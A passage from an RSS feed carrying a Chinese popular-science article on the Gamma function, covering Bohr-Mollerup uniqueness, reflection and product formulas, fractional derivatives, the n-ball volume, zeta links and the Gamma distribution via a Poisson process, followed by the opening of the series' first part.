\frac{x^{\alpha-1} e^{-x}}{\Gamma(\alpha)} &amp;amp; \text{for }x&amp;gt;0&lt;br&gt;
\\ 0 \quad \quad &amp;amp; \text{for }x &amp;lt; 0&lt;br&gt;
\end{aligned}&lt;br&gt;
\right.&lt;br&gt;
$$&lt;br&gt;
形成的集合 $\{f_\alpha : \alpha &amp;gt; 0\}$,那么该集合在卷积运算 $*$ 之下构成一个抽象代数中的半环，即满足&lt;br&gt;
$$ f_\alpha * f_\beta = f_{\alpha+\beta} .$$&lt;br&gt;
而用$\Pi(x)$ 的定义则无法得到类似的结果。&lt;/p&gt;
&lt;p&gt;另外一个更具启发性的解释是也是从抽象代数角度描述的。 对伽玛函数&lt;br&gt;
$$ \Gamma(x) = \int_0^{\infty} e^{-t}t^{x-1}dt $$&lt;br&gt;
做一个线性变换 $h: t \rightarrow ct$，可以得到如下函数&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{generalized-gamma}&lt;br&gt;
\frac{\Gamma(x)}{c^x} = \int_0^{\infty} e^{-ct} t^x \frac{dt}{t}&lt;br&gt;
\end{equation}&lt;br&gt;
由此 $dt/t = d \log t$ 可以被看成是乘法群 $(0, \infty)$ 上的一个不变测度，在尺度伸缩变换下满足不变性：&lt;br&gt;
$$ \frac{d(ct)}{ct} = \frac{dt}{t} .$$&lt;br&gt;
而 $e^{-ct}$ 对应于群上的一个加法特征(additive character) $f$， 满足&lt;br&gt;
$$f(t+s) =f(t) \cdot f(s) ,$$&lt;br&gt;
$t^x$ 对应于群上的一个乘法特征(mulpicative character) $g$， 满足&lt;br&gt;
$$g(t \cdot s) = g(t) \cdot g(s) .$$&lt;br&gt;
由于积分表示的是求和， 所以\eqref{generalized-gamma} 式 被看成是乘法群 $(0, \infty)$ 上加法特征和乘法特征混合乘积的累积求和。有了这个分解，只要在抽象代数的有限域上定义了$f$ 和$g$ 这两个映射， 实数域上定义的$\frac{\Gamma(x)}{c^x}$ 函数就可以被推广到有限域上进行定义，只是无限求和的积分号变成了有限求和符号$\Sigma$ 。 进一步，借用贝塔函数和伽玛函数满足的关系式\eqref{beta-gamma-decompose}, $Beta(x,y)$ 也可以完全类似的在有限域中定义出来， 而这种推广也将变得具有简洁的对称美。当然，这个理由和欧拉、勒让德的选择无关，而是现代数学家们给出的一个额外的解释。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;六、伽玛函数欣赏&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;伽玛函数从它诞生开始就被许多数学家追逐研究，包括高斯、勒让德、威尔斯特拉斯、柳维尔等等，数学家们发现了这个函数大量的奇特性质，在解决许多数学问题的时候是一把利器。伽玛函数作为阶乘的推广，首先它也满足如下的斯特林公式&lt;br&gt;
$$ \Gamma(x) \approx \sqrt{2\pi}e^{-x}x^{x-\frac{1}{2}} .$$&lt;br&gt;
另外， 伽玛函数不仅可以定义在实数集上，基于复变函数的理论还可以延拓到整个复平面上。所以我们不仅可以计算$ (\frac{1}{2})!, (-7.5)!$，我们甚至可以计算 $(\frac{1}{2} + \frac{1}{3}i)!$，阶乘的概念居然可以推广到虚数，这真是太神奇了！&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/gamma-complex.png&quot;&gt;&lt;img class=&quot;alignnone size-medium wp-image-209&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/gamma-complex-300x216.png&quot; alt=&quot;gamma-complex&quot; width=&quot;300&quot; height=&quot;216&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;复平面上的伽玛函数&lt;/p&gt;
&lt;p&gt;欧拉把$n!$ 推广之后得到了伽玛函数，很自然的一个问题是：伽玛函数是$n!$的唯一的插值推广函数吗？ 当然不是，丹尼尔·贝努利最早的无穷乘积推广就已经说明了存在多种推广延拓的方式。譬如$f(x) = \Gamma(x) \cos (2n\pi)$ 这个函数显然也满足把 $n!$ 延拓到实数集。 那伽玛函数在延拓 $n!$ 的时候有什么特殊的地方呢？ 从伽玛函数的图像我们可以看到它是一个凸函数，所以我们很自然地会问伽玛函数是否是唯一的满足凸性的阶乘函数，可是答案还是否定的。 那伽马函数为什么鹤立鸡群呢？数学家们发现不仅 $\Gamma(x)$ 是一个凸函数， $\log\Gamma(x)$ 也是一个凸函数，数学上可以证明如下定理:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;[Bohr-Mullerup 定理]&lt;/strong&gt; 如果 $f:(0,\infty)\rightarrow (0,\infty)$,且满足&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt; $f(1) = 1$&lt;/li&gt;
&lt;li&gt; $f(x+1) = xf(x)$&lt;/li&gt;
&lt;li&gt; $\log f(x)$ 是凸函数&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么 $f(x) = \Gamma(x)$, 也就是 $\Gamma(x)$是唯一满足以上条件的函数。&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/digamma-func.png&quot;&gt;&lt;img class=&quot;alignnone size-medium wp-image-208&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/digamma-func-300x233.png&quot; alt=&quot;digamma-func&quot; width=&quot;300&quot; height=&quot;233&quot;&gt;&lt;/a&gt;&lt;br&gt;
\$\log \Gamma(x)$ 是一个凸函数&lt;/p&gt;
&lt;p&gt;伽玛函数有不少等价的表示形式和神奇的结果。高斯给出的伽玛函数的形式是&lt;br&gt;
$$ \Gamma(x) = \lim_{n\rightarrow\infty} \frac{n^x n!}{x(x+1)(x+2)\cdots(x+n)} .$$&lt;br&gt;
欧拉证明了如下一个漂亮的反射公式&lt;br&gt;
$$ \Gamma(x) \Gamma(1-x) = \frac{\pi}{\sin (\pi x)} .$$&lt;br&gt;
维尔斯特拉斯把高斯的伽玛函数形式做一下变换，就得到如下表达为无穷乘积的结果&lt;br&gt;
$$ {\Gamma(x)} = \frac{1}{xe^{\gamma x}} \prod_{k=1}^\infty&lt;br&gt;
\frac{e^{\frac{x}{k}}} {1+\frac{x}{k}} .$$&lt;br&gt;
此处 $\gamma = 0.5772156649\cdots$ 为欧拉常数。这个结果在复平面上也成立。由于伽玛函数的这个分解形式的启发，导致维尔斯特拉斯发现复平面上任意整函数$f(z)$ 都以分解为无穷乘积形式。基于维尔斯特拉斯的这个无穷乘积形式和欧拉的反射公式，分别整理简化一下 $\Gamma(1+x)\Gamma(1-x)$，就可以轻松地得到介绍沃利斯公式的时候中提到的 $\sin x$ 的无穷乘积展开式。&lt;/p&gt;
&lt;p&gt;伽玛函数还有很多妙用，它能扩展一些重要的数学概念，譬如导数。我们可以定义一阶、二阶等整数阶导数，所以一个自然的问题是：我们能定义分数阶的导数吗？ 这个问题早年莱布尼茨研究微积分的时候他就提出来过，然而没有获得实质性进展。而欧拉给出了伽玛函数之后，也研究过分数阶导数的问题。我们观察一下函数$f(x) = x^n$ 的各阶导数&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/derivatives.png&quot;&gt;&lt;img class=&quot;wp-image-216  aligncenter&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/derivatives-1024x420.png&quot; alt=&quot;derivatives&quot; width=&quot;524&quot; height=&quot;215&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;由于k阶导数可以用阶乘表达，于是我们用伽玛函数表达为&lt;br&gt;
$$ f(x)^{(k)} = \frac{\Gamma{(n+1)}}{\Gamma{(n-k+1)}} x^{n-k} $$&lt;br&gt;
基于上式，可以把导数的阶从整数延拓到实数集。例如，取$n=1, k=\frac{1}{2}$ 我&lt;br&gt;
们可以计算 $x$ 的 $\frac{1}{2}$阶导数为&lt;br&gt;
$$ f(x)^{(\frac{1}{2})} = \frac{\Gamma{(1+1)}}{\Gamma{(1-1/2+1)}} x^{1-1/2}&lt;br&gt;
= \frac{2\sqrt{x}}{\sqrt{\pi}} .$$&lt;br&gt;
很容易想到对于一般的函数 $f(x)$ 通过泰勒级数展开可以表达为幂级数，于是借用 $x^n$ 的分数阶导数，我们可以尝试定义出任意函数的分数阶导数。不过有点遗憾的是这种简单的基于泰勒级数的定义方法不是良定义的，并非对所有函数都适用，但是这个思想却给后来的数学家提供了重要的线索，并由此发展了数学分析中的一个研究课题： Fractional Calculus。 在这种微积分中，分数阶的导数是具有良定义的，而积分作为导数的逆运算，也可以有分数阶。 这听起来真是很神奇，而这一切都要归功于伽玛函数。&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/n-dim-ball.jpg&quot;&gt;&lt;img class=&quot;size-medium wp-image-177 aligncenter&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/n-dim-ball-300x200.jpg&quot; alt=&quot;n-dim-ball&quot; width=&quot;300&quot; height=&quot;200&quot;&gt;&lt;/a&gt;&lt;br&gt;
n 维球的体积&lt;/p&gt;
&lt;p&gt;伽马函数还有一个奇妙的运用是求高维空间中球的体积。我们知道 二维球是圆；其面积为 $\pi r^2$，三维球的体积为 $\frac{4}{3} \pi r^3$，那$n$维空间中半径为$r$的球的体积如何计算呢？ 数学上这个体积应该是如下多重积分&lt;br&gt;
$$ \displaystyle V_n(r) = \idotsint\limits_{ \tiny \{(x_1, \cdots, x_n) | \sum x_i^2 &amp;lt; r^2 \} } 1 \quad dx_1dx_2 \cdots dx_n $$&lt;br&gt;
可以证明&lt;br&gt;
$$ V_n(r) = \frac{\pi^{\frac{n}{2}} r^n}{\Gamma(\frac{n}{2} + 1)} .$$&lt;/p&gt;
&lt;p&gt;下面我们来说一说伽玛函数和数论的关系。 伽玛函数和欧拉常数$\gamma$ 有密切关系，可以发现&lt;br&gt;
$$ \gamma = -\frac{d\Gamma(x)}{dx}|_{x=1} =&lt;br&gt;
\lim_{n\rightarrow \infty}(1+\frac{1}{2} + \frac{1}{3}+\cdots+\frac{1}{n} – \log n) $$&lt;br&gt;
欧拉常数$\gamma$ 是一个神奇的常数，数学家们至今也没搞清楚它是一个有理数还是一个无理数。进一步还可以发现伽玛函数和黎曼$\zeta(s)$函数&lt;br&gt;
$$ \zeta(s) = 1+\frac{1}{2^s} + \frac{1}{3^s} + \cdots $$&lt;br&gt;
有密切联系，黎曼发现了如下式子&lt;br&gt;
$$ \zeta(x) \Gamma(x) = \int_0^\infty \frac{u^{x-1}}{e^u – 1} du ,$$&lt;br&gt;
$$ \zeta(x) = \zeta(1-x) \Gamma(1-x) 2^s \pi^{s-1} \sin\left(\frac{\pi x}{2}\right) .$$&lt;br&gt;
$\zeta$ 函数在解析数论中可是有着举足轻重的地位，因为它涉及了数学中著名的素数分布定理和黎曼猜想，而以上两个式子在分析黎曼猜想过程中有重要作用。数学家蒙哥马利有一句名言：“假如你是一个魔鬼，引诱数学家用自己的灵魂来换取一个定理的证明。多数数学家会想要换取的会是什么定理呢，我想会是黎曼猜想。” 而希尔伯特曾说过，如果他在沉睡1000年后醒来, 他将问的第一个问题便是：黎曼猜想得到证明了吗？&lt;/p&gt;
&lt;p&gt;前面提到了 $\log\Gamma(x)$ 是一个凸函数。对这个函数求导得到的函数&lt;br&gt;
$$ \Psi(x) = \frac{d\log\Gamma(x)}{dx} $$&lt;br&gt;
被称为 Digamma 函数，可以证明&lt;br&gt;
$$\Psi(x) = -\gamma + (x-1) – \frac{(x-1)(x-2)}{2\cdot 2!}&lt;br&gt;
+ \frac{(x-1)(x-2)(x-3)}{3\cdot 3!} \cdots $$&lt;br&gt;
这也是一个很重要的函数，具有如下一个漂亮的性质&lt;br&gt;
$$ \Psi(x+1) = \Psi(x) + \frac{1}{x} .$$&lt;br&gt;
函数$\Psi(x)$和欧拉常数$\gamma$ 以及 $\zeta$ 函数都有密切关系，令&lt;br&gt;
$$ \Psi_n(x) = \frac{d^{n+1}\log\Gamma(x)}{dx^{n+1}} ,$$&lt;br&gt;
可以证明&lt;br&gt;
$$\Psi_1(x) = \frac{d^{2}\log\Gamma(x)}{dx^{2}}&lt;br&gt;
= \frac{1}{x^2} + \frac{1}{(x+1)^2} + \frac{1}{(x+2)^2} + \cdots .$$&lt;br&gt;
对于几个具体的数值，有如下漂亮的结果&lt;br&gt;
$$\Psi(1) = -\gamma, \quad \quad \Psi(2) = 1-\gamma $$&lt;br&gt;
$$\Psi_1(1) = \zeta(2) = 1 + \frac{1}{2^2} + \frac{1}{3^2} + \frac{1}{4^2} + \cdots&lt;br&gt;
= \frac{\pi^2}{6} $$&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;七、随机数学中的伽马函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;伽玛函数在概率统计中频繁现身，众多的统计分布，包括常见的统计学三大分布($t$ 分布，$\chi^2$ 分布，$F$ 分布)、贝塔分布、狄利克雷分布的密度公式中都有伽玛函数的身影。当然发生最直接联系的概率分布是直接由伽玛函数变换得到的伽玛分布。对伽玛函数的定义做一个变形，就可以得到如下式子&lt;br&gt;
$$ \int_0^{\infty} \frac{x^{\alpha-1}e^{-x}}{\Gamma(\alpha)}dx = 1 .$$&lt;br&gt;
于是，取积分中的函数作为概率密度，就得到一个形式最简单的伽玛分布的密度函数&lt;br&gt;
$$Gamma(x|\alpha) = \frac{x^{\alpha-1}e^{-x}}{\Gamma(\alpha)} .$$&lt;br&gt;
如果做一个变换 $x=\beta t$, 就得到伽玛分布的更一般的形式&lt;br&gt;
$$Gamma(t|\alpha, \beta) = \frac{\beta^\alpha t^{\alpha-1}e^{-\beta t}}{\Gamma(\alpha)} .$$&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/gamma-distribution.png&quot;&gt;&lt;img class=&quot;alignnone size-medium wp-image-210&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/gamma-distribution-300x228.png&quot; alt=&quot;gamma-distribution&quot; width=&quot;300&quot; height=&quot;228&quot;&gt;&lt;/a&gt;&lt;br&gt;
$Gamma(t|\alpha,\beta)$分布图像&lt;/p&gt;
&lt;p&gt;伽玛分布在概率统计领域也是一个万人迷，众多统计分布和它有密切关系。指数分布和 $\chi^2$ 分布都是特殊的伽玛分布。另外伽玛分布是一个很强大的先验分布，在贝叶斯统计分析中被广泛的用作其它分布的先验。如果把统计分布中的共轭关系类比为人类生活中的情侣关系的话，那指数分布、泊松分布、正态分布、对数正态分布都可以是伽玛分布的情人。&lt;/p&gt;
&lt;p&gt;接下来的内容中我们主要关注$\beta = 1$的简单形式的伽玛分布。伽玛分布首先和泊松分布发生密切的联系。我们容易发现伽玛分布的概率密度和泊松分布在数学形式上具有高度的一致性。参数为$\lambda$的泊松分布，概率写为&lt;br&gt;
$$Poisson(X=k|\lambda) = \frac{\lambda^k e^{-\lambda}}{k!} $$&lt;br&gt;
在伽玛分布的密度中取 $\alpha = k+1$ 得到&lt;br&gt;
$$ Gamma(\lambda|\alpha=k+1)&lt;br&gt;
= \frac{\lambda^ke^{-\lambda}}{\Gamma(k+1)}= \frac{\lambda^k e^{-\lambda}}{k!} $$&lt;br&gt;
所以这两个分布的数学形式具有高度的一致性，只是泊松分布是离散的，伽玛分布是连续的。这种数学上的一致性是偶然的吗？ 事实上，从泊松分布出发，可以利用一个简单的概率物理模型对伽玛分布的密度函数给出清晰的解释。&lt;/p&gt;
&lt;p&gt;泊松分布可以用于描述一段时间内事件发生次数的统计性质，譬如接到的电话的次数。假设我们关心的不是一段有限的时间，而是 $(0, \infty)$ 整个时间轴上接到电话的统计性质，应该如何来描述呢？我们可以假设接到的电话满足如下性质&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;概率在时间轴是独立均匀分布的，即每个等长的时间区间上是否接到电话是独立的，并且概率分布一样；每一个长度为h的充分小的时间片上接到一个电话的概率正比于时间片的长度；&lt;/li&gt;
&lt;li&gt;每一个充分小时间片上最多只能接到一个电话。&lt;/li&gt;
&lt;li&gt;平均而言，假设每个长度为1的单位时间片上接到电话个数是1；&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果我们考察 $[0, \lambda]$ 这个时间区间，那么平均而言，这个长度为 $\lambda$ 的时间片上应该接到 $\lambda$ 个电话，把这个时间区间分成 $n$ 个独立的小片，那么每个时间片上接到一个电话的概率恰好是 $p = \lambda/n$。当$n$ 足够大的时候，每个时间片上只能是接到一个电话或者没有接到电话，恰好对应于成功概率为$p$ 的一个贝努利实验，于是$n$ 个时间片对应于$n$ 个独立的贝努利实验，所以 $[0, \lambda]$这个时间区间上接到的电话总数$X$ 应该符合二项分布&lt;br&gt;
$$p(X=k) = \binom{n}{k} p^k(1-p)^{n-k} .$$&lt;br&gt;
由于 $np= \lambda$, 于是 $n$ 趋向于无穷的时候，粒子个数$X$将满足参数为&lt;br&gt;
$\lambda$ 的泊松分布&lt;br&gt;
$$p(X=k) = \frac{\lambda^k e^{-\lambda}}{k!} .$$&lt;/p&gt;
&lt;p&gt;熟悉随机过程理论的读者马上会发现以上模型实际上是参数为1 的泊松过程。 我们关心的问题是：什么时候会接到第${k+1}$ 个电话？或者说接到第$k+1$ 个电话的时间点 $Y_{k+1}$ 会是什么概率分布？ 形式化的描述就是如何计算如下的概率？&lt;br&gt;
$$ P(\lambda &amp;lt; Y_{k+1} \le \lambda + d\lambda) = ? $$&lt;br&gt;
上式表明第$k+1$ 个电话落在长度为 $d\lambda$ 的区间 $(\lambda, \lambda + d\lambda] $ 内，这个概率事件可以分解为两个独立事件&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;区间 $(\lambda, \lambda + d\lambda] $ 内接到一个电话，这个概率是 $d \lambda$&lt;/li&gt;
&lt;li&gt;区间 $[0, \lambda]$ 内接到了前$k$ 个电话，这个概率是 &lt;span style=&quot;line-height: 1.5;&quot;&gt;$$ p(X=k) = \frac{\lambda^k e^{-\lambda}}{k!} .$$&lt;/span&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;于是所求的概率是以上两个事件概率相乘，即&lt;br&gt;
$$ P(\lambda &amp;lt; Y_{k+1} \le \lambda + d\lambda) = p(X=k) \cdot d \lambda .$$&lt;br&gt;
由于第$k+1$ 个电话必然出现在时间轴上某处，所以把时间轴所有无穷小区间上的概率累加起来，正好对应于必然事件的概率1，所以有&lt;br&gt;
$$ \int_0^\infty p(X=k) \cdot d \lambda = 1 $$ 把$P(X=k)$ 带入上式即可得到&lt;br&gt;
$$ \int_0^\infty \frac{\lambda^k e^{-\lambda}}{k!} d \lambda = 1 $$&lt;br&gt;
$$ k! = \int_0^\infty \lambda^k e^{-\lambda} d \lambda $$&lt;br&gt;
上述两式整好就对应于伽玛分布和伽玛函数。所以$Y_{k+1}$ 恰好符合伽玛分布。 我们其实从泊松分布出发，完全基于概率物理模型，推导出了伽玛函数，而推导的过程也同时给伽玛分布的密度函数提供了物理解释。&lt;/p&gt;
&lt;p&gt;如果我们把伽玛函数和$e^\lambda$的泰勒展开式对照写成如下形式&lt;br&gt;
\begin{align} e^\lambda &amp;amp; = \sum_{k=0}^{\infty} {\lambda^k \over k!} \\&lt;br&gt;
k! &amp;amp; = \int_0^{\infty} {\lambda^k \over e^\lambda}\ d\lambda.&lt;br&gt;
\end{align}&lt;br&gt;
我们发现这两个式子形式上具有对偶关系。由于 $\sum$ 和$\int$ 都表示求和， 几乎可以认为从第一个式子只是把 $e^\lambda$ 和 $k!$ 交换一下就得到了第二个式子。 这两个式子之间有更多的内在联系吗？事实上有如下一个奇妙的等式成立 \begin{equation} \label{gamma-e-taylor} \frac{1}{k!} \int_0^\lambda \frac{\lambda^k}{e^\lambda} d\lambda + \frac{1}{e^\lambda} \sum_{n=0}^k \frac{\lambda^n}{n!} = 1&lt;br&gt;
\end{equation}&lt;br&gt;
用上面描述的泊松过程的物理模型，可以很容易的证明这个等式。我们把数轴分成 $(0, \lambda]$ 和 $(\lambda, \infty)$ 这两个区间，考察第$k+1$ 个电话接到时间 $Y_{k+1}$ 分别落在这两个区间的概率，当然有 $$ P(Y_{k+1} \le \lambda) + P(Y_{k+1} &amp;gt; \lambda) = 1 $$&lt;br&gt;
按照上述的物理模型，显然第$k+1$ 个电话的时间落入$(0, \lambda]$ 的概率为&lt;br&gt;
$$ P(Y_{k+1} \le \lambda) = \int_0^\lambda \frac{\lambda^k e^{-\lambda}}{k!} d \lambda $$&lt;br&gt;
如果第$k+1$ 个电话的时间点落入 $(\lambda, \infty)$，这个事件等价地可以理解为 $(0, \lambda]$ 上的电话个数不能超过 $k$ 个，由于$(0, \lambda]$ 这个有限时间区间上的电话次数符合参数为$\lambda$ 的泊松分布， 所以这个概率为&lt;br&gt;
$$ P(Y_{k+1} &amp;gt; \lambda) = \sum_{n=0}^k \frac{\lambda^n e^{-\lambda} }{n!} $$&lt;br&gt;
所以我们得到&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{poisson-gamma-dual}&lt;br&gt;
\int_0^\lambda \frac{\lambda^k e^{-\lambda}}{k!}d\lambda&lt;br&gt;
+ \sum_{n=0}^k \frac{\lambda^n e^{-\lambda}}{n!} = 1&lt;br&gt;
\end{equation}&lt;br&gt;
这个式子俗称泊松-伽玛对偶，简单整理一下就是 \eqref{gamma-e-taylor} 式。&lt;/p&gt;
&lt;p&gt;由于泊松分布可以看做是二项分布的极限分布，所以我们也可以从二项分布的角度对伽马分布进行解释。由于&lt;br&gt;
$$ e^{-\lambda} = \lim_{n\rightarrow \infty} (1- \frac{\lambda}{n}) ^n $$&lt;br&gt;
所以伽马分布的概率密度可以重写为&lt;br&gt;
\begin{align*}&lt;br&gt;
\frac{\lambda^k e^{-\lambda}}{k!}&lt;br&gt;
&amp;amp; = \lim_{n\rightarrow \infty} \frac{\lambda^k (1-\frac{\lambda}{n}) ^n}{k!} \\&lt;br&gt;
&amp;amp; = \lim_{n\rightarrow \infty} \frac{ n! n^k (\frac{\lambda}{n})^k (1-\frac{\lambda}{n}) ^n}{k! \cdot n!} \\&lt;br&gt;
&amp;amp; = \lim_{n\rightarrow \infty} \frac{(n+k)!}{k!\cdot n!} (\frac{\lambda}{n})^k (1-\frac{\lambda}{n}) ^n \\&lt;br&gt;
&amp;amp; = \lim_{n\rightarrow \infty} \binom{n+k}{k} (\frac{\lambda}{n})^k (1-\frac{\lambda}{n}) ^n&lt;br&gt;
\end{align*}&lt;br&gt;
显然上式具有明确的二项分布的物理含义。事实上，二项分布和贝塔分布之间也存在完全类似\eqref{poisson-gamma-dual} 的一个等式：&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{binomial-beta-dual}&lt;br&gt;
\frac{n!}{k!(n-k-1)!} \int_0^p t^k(1-t)^{n-k-1} dt + \sum_{v=0}^k \binom{n}{v} p^v(1-p)^{n-v} = 1&lt;br&gt;
\end{equation}&lt;br&gt;
如果我们知道$n\rightarrow\infty$时上式中二项分布的极限是泊松分布，而贝塔分布的极限是伽玛分布，那么就很容易理解 \eqref{poisson-gamma-dual} 其实可以看做是 \eqref{binomial-beta-dual} 的极限形式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;八、结语&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;作家海明威说：“冰山运动之雄伟壮观，是因为它只有八分之一在水面上。”阶乘，这么一个简单的基于整数的数学概念，俨然是一座冰山，我们日常看到的只是它浮在水面上的一角。而数学家们眼光犀利，看出这座山并非只有整数的一角，他们逐步地深入挖掘探索，挖出了神奇的伽马函数，把深藏在冰山下的实数域、复数域、甚至有限域都给挖了出来。而挖掘出来的伽玛函数真是一个魔术师，它跨越了人们的直觉想象，使得许多数学概念能够神奇地从整数延拓到分数；而伽玛函数同时又在现代数学的各个分支中表演着自己的神奇技艺。有许多人认为数学的概念是静态的：这些数学概念产生于历史上某一个时刻，某一位数学大家之手，之后就几乎一成不变了。对于大多数非数学专业的人而言，这种感觉貌似很自然，毕竟普通读者所接触的几何、代数、微积分这些数学知识都已经体系成熟，存在了几百甚至上千年。 然而数学的发展其实是先有探索的阶段，然后才有逻辑与体系，只是我们的数学课本历来偏重后者而忽视前者。而如果我们对数学知识的探索过程有所了解的话，会发现这些探索也犹如冰山掩藏在水面之下的部分，甚至比露出的尖角还更具魅力。&lt;/p&gt;
&lt;p&gt;台湾的数学教授蔡聪明先生在数学的科普传播方面写过大量的文章，他在《数学的发现趣谈》一书中对于数学的创造、发现与发展有一段精彩的论述：“如果你不知道一个定理（或公式）是怎样发现的，那么你对它并没有真正的了解，因为真正的了解必须从逻辑因果掌握到创造的心理因果。一个定理的诞生，基本上跟一粒种子在适当的土壤、风雨、阳光、气候 … 之下，发芽成一颗树，再开花结果，并没有两样。”本文尝试尽可能的呈现伽玛函数这颗数学之树的生长历程，可以说伽玛函数的种子最早是沃利斯播下的，欧拉给予了最好的施肥、灌溉使得种子发芽，而后来众多数学家们的努力使得这颗嫩芽茁壮成长，最终几乎成长为一颗参天大树。&lt;/p&gt;
&lt;p&gt;伽玛函数这颗大树在现代数学中如此繁茂，笔者知识有限仅能描绘它很有限的一部分。这个函数在数学上魅力独特，不仅能够被一个理科本科生很好的理解，它本身又足够的深刻，具有很多漂亮的数学性质，历史上吸引了众多一流的数学家对它进行探索研究。美国数学家 Philip J.Davis 在1959年在《美国数学月刊》上发表了一篇很有名的介绍伽玛函数的文章，文中对伽玛函数一些特性发现的历史进行了详细的描述，这篇文章获得了 Chauvenet Prize (美国数学会颁发的数学科普奖)。 他在文中最后总结道：&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Each generation has found something of interest to say about the gamma function. Perhaps the next generation will also. (每一代人都发现了一些伽马函数的有趣性质，也许下一代人也会有所发现。)&lt;/em&gt;&lt;br&gt;
—Philip J.Davis&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;九、推荐阅读&lt;/strong&gt;&lt;br&gt;
如果希望了解更多阶乘研究以及伽玛函数相关的历史，推荐阅读如下文献：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;蔡聰明, 瓦里斯尋$\pi$ 的發現理路,科学月刊, 27(4) 1996&lt;/li&gt;
&lt;li&gt;蔡聰明, 瓦里斯公式及其相關的結果,科学月刊, 27(5), 1996&lt;/li&gt;
&lt;li&gt;蔡聰明, 談 Stirling 公式, 数学传播 , 17(2), 1993&lt;/li&gt;
&lt;li&gt;Philip J. Davis, Leonhard Euler’s Integral: A Historical Profile of the Gamma Function, The American Mathematical Monthly, vol. 66, pp. 849-869, 1959&lt;/li&gt;
&lt;li&gt;Jacques Dutka, The Early History of the Factorial Function, Archive for History of Exact Sciences, 43 (3), pp. 225-249, 1991&lt;/li&gt;
&lt;li&gt;Detlef Gronnau, Why is the gamma function so as it is?, Teaching Mathematics and Computer Science, 2003&lt;/li&gt;
&lt;li&gt;Emil Artin, The Gamma function(English Traslation), Holt, Rinehart and Winston, Inc., 1964&lt;/li&gt;
&lt;li&gt;George E. Andrews et al., Special Functions, Cambridge University Press, 2001&lt;/li&gt;
&lt;li&gt;Ian Tweddle, James Stirling’s Methodus Differentialis: An Annotated Translation of Stirling’s Text, Springer, 2003&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;http://www.flickering.cn&quot;&gt;&lt;img class=&quot;aligncenter&quot; src=&quot;http://www.flickering.cn/logo/flickering-logo.png&quot; alt=&quot;火光摇曳&quot; width=&quot;201&quot; height=&quot;213&quot;&gt;&lt;/a&gt;&lt;/p&gt;

											

</description>
        <pubDate>Tue, 01 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-01-%25e7%2581%25ab%25e5%2585%2589%25e6%2591%2587%25e6%259b%25b3%25e7%25a5%259e%25e5%25a5%2587%25e7%259a%2584%25e4%25bc%25bd%25e7%258e%259b%25e5%2587%25bd%25e6%2595%25b0%25e4%25b8%258b-80f0c99be.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-01-%25e7%2581%25ab%25e5%2585%2589%25e6%2591%2587%25e6%259b%25b3%25e7%25a5%259e%25e5%25a5%2587%25e7%259a%2584%25e4%25bc%25bd%25e7%258e%259b%25e5%2587%25bd%25e6%2595%25b0%25e4%25b8%258b-80f0c99be.html</guid>
        
        
      </item>
    
      <item>
        <title>[火光摇曳]神奇的伽玛函数(上)</title>
        <description>

						&lt;p&gt;原文链接： &lt;a href=&quot;http://www.flickering.cn/?p=163&quot;&gt;http://www.flickering.cn/?p=163&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一、开篇&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;数学爱好者们汇集在网络论坛上的一大乐事就是对各类和数学相关的事物评头论足、论资排辈。如果要评选历史上最伟大的数学家，就会有一大堆的粉丝围绕高斯、黎曼、牛顿、欧拉、阿基米德等一流人物展开口水战；如果要讨论最奇妙的数学常数，$e, \pi, \phi=\frac{\sqrt{5}-1}{2} $ 肯定在候选队列中；如果要推举最美丽的数学公式，欧拉公式 $e^{i\pi} + 1= 0$ 与和式 $ 1 + \frac{1}{2^2} + \frac{1}{3^2} + \frac{1}{4^2} + \cdots = \frac{\pi^2}{6} $ 常常被数学爱好者们提及；如果有人追问最神奇的数学函数是什么？ 这个问题自然又会变得极具争议，而我相信如下这个长相有点奇特的伽玛函数&lt;br&gt;
$$ \Gamma(x)=\int_0^{\infty}t^{x-1}e^{-t}dt $$&lt;br&gt;
一定会出现在候选队列中。&lt;/p&gt;
